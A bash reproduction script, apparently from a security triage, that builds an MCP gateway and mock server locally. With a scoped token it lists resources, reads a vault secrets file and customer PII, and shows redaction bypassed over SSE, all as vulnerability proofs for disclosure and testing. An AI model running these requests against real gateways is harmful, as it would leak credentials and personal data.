set -uo pipefail
A=/home/lhmisme/vata/dual-repro/ttokkime-toolslist-rbac/artifacts
H=/home/lhmisme/vata/dual-repro/ttokkime-toolslist-rbac/human
SRC=/home/lhmisme/vata/triage/mcp-gateway
mkdir -p "$H"

( cd "$SRC" && go build -o /tmp/gw ./cmd/gateway && go build -o /tmp/mock ./cmd/mockmcp ) || { echo "BUILD FAILED"; exit 1; }
cp "$A/vata-config.json" /tmp/vata-config.json

pkill -f '/tmp/mock' 2>/dev/null; pkill -f '/tmp/gw' 2>/dev/null; sleep 0.3
/tmp/mock -addr :9000 -leak-pii=false >/tmp/mock.log 2>&1 &
/tmp/gw   -config /tmp/vata-config.json >/tmp/gw.log 2>&1 &
trap 'pkill -f "/tmp/mock" 2>/dev/null; pkill -f "/tmp/gw" 2>/dev/null' EXIT
for i in $(seq 1 15); do curl -sf http://127.0.0.1:8080/healthz >/dev/null && break; sleep 0.2; done

verdict() { if [ "$2" = "200" ] && ! grep -qi 'not permitted\|unauthorized' "$1"; then echo ALLOWED; else echo DENIED; fi; }

echo "===== PROOF 4: scoped enumerates resources ====="
c4=$(curl -s -o "$H/04_scoped_resourceslist_LEAK.json" -w '%{http_code}' -H 'Authorization: Bearer tok_scoped' \
  -d '{"jsonrpc":"2.0","id":4,"method":"resources/list","params":{}}' http://127.0.0.1:8080/mcp)
echo "resources/list -> HTTP $c4 -> $(verdict "$H/04_scoped_resourceslist_LEAK.json" "$c4")"

echo; echo "===== PROOF 5a: scoped reads SECRETS (redactor misses -> raw egress) ====="
c5a=$(curl -s -o "$H/05a_scoped_read_secrets_LEAK.json" -w '%{http_code}' -H 'Authorization: Bearer tok_scoped' \
  -d '{"jsonrpc":"2.0","id":5,"method":"resources/read","params":{"uri":"file:///vault/deploy-secrets.env"}}' http://127.0.0.1:8080/mcp)
v5a=$(verdict "$H/05a_scoped_read_secrets_LEAK.json" "$c5a")
echo "resources/read secrets -> HTTP $c5a -> $v5a"
grep -o 'AKIA[A-Z0-9]*' "$H/05a_scoped_read_secrets_LEAK.json" >/dev/null && echo "  >> RAW AWS KEY PRESENT in response"

echo; echo "===== PROOF 5b: scoped reads PII (redactor catches; also corrupts JSON) ====="
c5b=$(curl -s -o "$H/05b_scoped_read_pii_REDACTOR_BROKE_JSON.json" -w '%{http_code}' -H 'Authorization: Bearer tok_scoped' \
  -d '{"jsonrpc":"2.0","id":6,"method":"resources/read","params":{"uri":"file:///vault/customer-pii.txt"}}' http://127.0.0.1:8080/mcp)
v5b=$(verdict "$H/05b_scoped_read_pii_REDACTOR_BROKE_JSON.json" "$c5b")
echo "resources/read pii -> HTTP $c5b -> $v5b"
python3 -c "import json; json.load(open('$H/05b_scoped_read_pii_REDACTOR_BROKE_JSON.json'))" 2>/dev/null \
  && echo "  >> valid JSON" || echo "  >> INVALID JSON (redactor corrupted escape — finding #2)"

echo; echo "===== PROOF 5c: scoped reads PII via SSE (content-type bypasses redaction) ====="
c5c=$(curl -s -o "$H/05c_scoped_read_sse_LEAK.txt" -w '%{http_code}' -H 'Authorization: Bearer tok_scoped' \
  -d '{"jsonrpc":"2.0","id":7,"method":"resources/read","params":{"uri":"file:///vault/stream-pii.txt"}}' http://127.0.0.1:8080/mcp)
echo "resources/read sse -> HTTP $c5c"
if grep -q 'jane.doe@example.com' "$H/05c_scoped_read_sse_LEAK.txt"; then
  echo "  >> RAW PII 'jane.doe@example.com' PRESENT — redaction BYPASSED via text/event-stream"
else
  echo "  >> PII not found raw — redaction may have applied (check file)"
fi
echo "  --- 05c body ---"; cat "$H/05c_scoped_read_sse_LEAK.txt"

echo; echo "===== VERDICT ====="
echo "authz gap: secrets=$v5a pii=$v5b | sse egress + json-corruption = supporting findings"
ls -la "$H"
